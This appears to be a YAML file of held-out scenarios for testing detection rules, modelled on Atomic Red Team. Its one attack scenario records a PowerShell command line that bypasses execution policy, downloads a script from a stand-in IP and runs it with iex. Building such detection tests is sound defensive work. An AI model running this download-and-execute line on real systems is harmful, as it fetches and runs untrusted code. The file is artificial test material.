# Held-out round 1. Written AFTER the first tuning pass, in the style of public Atomic Red Team /
# real-incident command lines, without iterating on rule regexes. The score of the FIRST run of this
# file is recorded in reports/history.md; any later fix is remediation against these scenarios and is
# labelled as such. Treat first-run numbers as the optimistic-but-least-fitted estimate we have.
scenarios:
# ---- attacks
- {id: HLD-001, name: Atomic T1059.001 download and exec via IWR, techniques: [T1059.001], tactic: TA0002, events: [{title: Process creation, event_type: process.start, command_line: "powershell.exe -ep bypass -c \"iwr -uri https://203.0.113.20/stage.ps1 -UseBasicParsing | iex\""}]}
